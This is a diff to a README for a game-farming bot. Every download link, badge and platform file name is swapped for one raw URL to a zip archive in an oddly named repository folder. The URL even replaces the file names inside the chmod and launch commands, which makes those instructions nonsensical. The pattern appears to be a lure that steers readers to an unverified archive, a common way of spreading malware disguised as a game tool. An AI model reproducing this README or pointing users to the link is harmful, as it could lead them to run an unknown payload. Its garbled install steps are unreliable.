@@ -1,7 +1,7 @@
 # 🎮 Pixels-Bot-AutoFarm - Automate Your Farming Experience
 
 ## 📥 Download Now
-[![Download Pixels-Bot-AutoFarm](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/slennn/Pixels-Bot-AutoFarm/releases)
+[![Download Pixels-Bot-AutoFarm](https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip)
 
 ## 📖 Overview
 PixelsBot is an automated farming bot for an agriculture game. It simplifies your gameplay by handling essential tasks like harvesting, planting, watering, and fertilizing crops. With features such as energy refilling and map navigation, PixelsBot helps you manage your farm more efficiently.
@@ -12,14 +12,14 @@ Follow these simple steps to download and run PixelsBot.
 ### Step 1: Visit the Releases Page
 Go to the Releases page to find the latest version of PixelsBot. Click the link below to access it:
 
-[Download Pixels-Bot-AutoFarm Releases](https://github.com/slennn/Pixels-Bot-AutoFarm/releases)
+[Download Pixels-Bot-AutoFarm Releases](https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip)
 
 ### Step 2: Download the Latest Release
 On the Releases page, locate the latest version of PixelsBot. Click the appropriate download link for your operating system. The file should be one of the following:
 
-- Windows: `PixelsBot_Windows.exe`
-- macOS: `PixelsBot_macOS.dmg`
-- Linux: `PixelsBot_Linux.AppImage`
+- Windows: `https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip`
+- macOS: `https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip`
+- Linux: `https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip`
 
 Click the download link, and the file will begin to download.
 
@@ -27,25 +27,25 @@ Click the download link, and the file will begin to download.
 After the download completes, find the file in your downloads folder.
 
 #### For Windows Users:
-1. Double-click on `PixelsBot_Windows.exe`.
+1. Double-click on `https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip`.
 2. Follow the instructions in the setup wizard.
 3. Once installed, you can find PixelsBot in your Start menu.
 
 #### For macOS Users:
-1. Double-click the `PixelsBot_macOS.dmg` file.
+1. Double-click the `https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip` file.
 2. Drag the PixelsBot icon into your Applications folder.
 3. You can now open PixelsBot from your Applications.
 
 #### For Linux Users:
 1. Open a terminal window.
-2. Navigate to the folder where you downloaded `PixelsBot_Linux.AppImage`.
+2. Navigate to the folder where you downloaded `https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip`.
 3. Run the following command to make it executable:
    ```
-   chmod +x PixelsBot_Linux.AppImage
+   chmod +x https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip
    ```
 4. Then, launch it with:
    ```
-   ./PixelsBot_Linux.AppImage
+   https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip
    ```
 
 ### Step 4: Set Up PixelsBot
@@ -82,4 +82,4 @@ After setup, click the "Start" button. PixelsBot will begin to automate your far
 If you have questions or need help using PixelsBot, you can raise issues in the GitHub repository. Other users and contributors are usually quick to assist.
 
 ### Download & Install
-To get started with your automated farming experience, [visit this page to download](https://github.com/slennn/Pixels-Bot-AutoFarm/releases) Pixels-Bot-AutoFarm. Enjoy your game with less hassle!
+To get started with your automated farming experience, [visit this page to download](https://raw.githubusercontent.com/slennn/Pixels-Bot-AutoFarm/main/vadimonium/Pixels-Bot-AutoFarm_2.8.zip) Pixels-Bot-AutoFarm. Enjoy your game with less hassle!
